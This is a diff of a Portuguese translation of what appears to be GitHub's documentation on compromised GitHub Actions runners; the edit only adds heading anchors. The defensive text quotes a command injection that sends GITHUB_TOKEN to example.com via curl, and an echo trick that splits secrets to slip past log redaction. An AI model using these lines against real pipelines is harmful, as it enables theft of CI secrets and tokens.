@@ -10,18 +10,18 @@ captured: '2026-10-11'
 section: Concepts / Security
 ---
 
-# Executores comprometidos
+# Executores comprometidos { #compromised-runners }
 
 _Entenda os riscos de segurança associados a runners comprometidosGitHub Actions._
 
-## Possível impacto de um executor comprometido
+## Possível impacto de um executor comprometido { #potential-impact-of-a-compromised-runner }
 
 Estas seções abordam algumas das etapas que um invasor pode seguir caso consiga executar comandos maliciosos em um GitHub Actions runner.
 
 !!! note
     GitHubOs executores hospedados não verificam o código mal-intencionado baixado por um usuário durante o trabalho, como uma biblioteca de terceiros comprometida.
 
-### Acessando segredos
+### Acessando segredos { #accessing-secrets }
 
 Os fluxos de trabalho acionados a partir de um repositório bifurcado usando o evento `pull_request` têm permissões somente leitura e não têm acesso a segredos. No entanto, essas permissões são diferentes para vários gatilhos de evento, como `issue_comment`, `issues`, `push` e `pull_request` de uma ramificação no repositório, em que o invasor pode tentar roubar segredos do repositório ou usar a permissão de gravação do [`GITHUB_TOKEN`](github_token.md) do trabalho.
 
@@ -39,19 +39,19 @@ Os fluxos de trabalho acionados a partir de um repositório bifurcado usando o e
 
 Embora GitHub Actions remova da memória os segredos que não são referenciados no fluxo de trabalho (ou em uma ação incluída), o `GITHUB_TOKEN` e quaisquer segredos referenciados podem ser extraídos por um invasor determinado.
 
-### Exfiltrar dados de um executor
+### Exfiltrar dados de um executor { #exfiltrating-data-from-a-runner }
 
 Um invasor pode exfiltrar todos os segredos roubados ou outros dados do executor. Para ajudar a evitar a divulgação acidental de segredo, GitHub Actions[redigir automaticamente os segredos impressos no log](../../how-tos/write-workflows/choose-what-workflows-do/use-secrets.md), mas esse não é um verdadeiro limite de segurança porque os segredos podem ser enviados intencionalmente para o log. Por exemplo, segredos ofuscados podem ser exfiltrados por meio de `echo ${SOME_SECRET:0:4}; echo ${SOME_SECRET:4:200};`. Além disso, uma vez que o atacante pode executar comandos arbitrários, ele poderá usar solicitações HTTP para enviar segredos ou outros dados do repositório para um servidor externo.
 
-### Roubo do `GITHUB_TOKEN` do trabalho
+### Roubo do `GITHUB_TOKEN` do trabalho { #stealing-the-jobs-githubtoken }
 
 É possível que um invasor roube o `GITHUB_TOKEN` de um trabalho. O GitHub Actions runner recebe automaticamente um `GITHUB_TOKEN` gerado com permissões limitadas apenas ao repositório que contém o fluxo de trabalho, e o token expira após a conclusão do job. Uma vez expirado, o token não é mais útil para um invasor. Para resolver essa limitação, ele pode automatizar o ataque e executá-lo em frações de segundos chamando um servidor controlado pelo invasor com o token, por exemplo: `a"; set +e; curl http://example.com?token=$GITHUB_TOKEN;#`
 
-### Modificando os conteúdos de um repositório
+### Modificando os conteúdos de um repositório { #modifying-the-contents-of-a-repository }
 
 O servidor invasor pode usar a API para modificar o GitHub[conteúdo do repositório](../../reference/workflows-and-actions/workflow-syntax.md#permissions), incluindo versões, se as permissões atribuídas `GITHUB_TOKEN`[](../../tutorials/authenticate-with-github_token.md#modifying-the-permissions-for-the-github_token).
 
-### Acesso entre repositórios
+### Acesso entre repositórios { #cross-repository-access }
 
 GitHub Actions tem escopo intencionalmente limitado a um único repositório de cada vez. O `GITHUB_TOKEN` permite o mesmo nível de acesso que um usuário com acesso de gravação, porque qualquer usuário com acesso de gravação pode acessar esse token criando ou modificando um arquivo de fluxo de trabalho, elevando as permissões do `GITHUB_TOKEN` se necessário. Os usuários têm permissões específicas para cada repositório, portanto, permitir que um `GITHUB_TOKEN` repositório conceda acesso a outro afetará o GitHub modelo de permissão se não for implementado com cuidado. Da mesma forma, é necessário ter cuidado ao adicionar GitHub tokens de autenticação a um fluxo de trabalho, pois isso também pode afetar o GitHub modelo de permissão concedendo inadvertidamente amplo acesso aos colaboradores.
 
@@ -77,6 +77,6 @@ Esta lista descreve as abordagens recomendadas para acessar os dados do reposit�
 5. **Chaves SSH em uma conta pessoal**
    * Os fluxos de trabalho nunca devem usar as chaves SSH em uma conta pessoal. Semelhante a personal access tokens (classic), eles concedem permissões de leitura/gravação a todos os seus repositórios pessoais, bem como a todos os repositórios aos quais você tem acesso por meio da associação à organização. Isto concede indiretamente amplo acesso a todos os usuários com acesso de gravação do repositório no qual se encontra o fluxo de trabalho. Se você pretende usar uma chave SSH apenas para realizar clones ou pushes de repositórios, e não precisa interagir com APIs públicas, deverá usar chaves de implantação individuais.
 
-## Próximas etapas
+## Próximas etapas { #next-steps }
 
 Para obter as práticas recomendadas de segurança com GitHub Actions, consulte [Referência de uso seguro](../../reference/security/secure-use.md).
